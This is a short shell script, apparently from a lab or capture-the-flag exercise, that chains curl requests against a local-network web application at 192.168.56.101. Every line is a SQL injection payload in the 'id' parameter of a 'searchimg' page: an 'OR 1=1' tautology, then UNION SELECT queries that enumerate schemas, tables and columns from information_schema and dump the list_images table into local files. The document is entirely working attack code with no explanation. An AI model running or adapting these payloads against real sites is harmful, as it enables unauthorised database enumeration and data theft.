curl "http://192.168.56.101/index.php?page=searchimg&id=1 OR 1=1--&Submit=Submit#" > allimages.html \
&& \
curl "http://192.168.56.101/index.php?page=searchimg&id=1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata--&Submit=Submit#" > databases.html \
&&
curl "http://192.168.56.101/index.php?page=searchimg&id=1 UNION ALL SELECT NULL, table_name FROM information_schema.tables--&Submit=Submit#" > tables.html \
&&
curl "http://192.168.56.101/index.php?page=searchimg&id=1 UNION ALL SELECT NULL, column_name FROM information_schema.COLUMNS--&Submit=Submit#" > columns.html \
&& \
curl "http://192.168.56.101/index.php?page=searchimg&id=1 UNION ALL SELECT NULL, concat(id,0x3a,url,0x3a,title,0x3a,comment) FROM list_images--&Submit=Submit#" > datas.html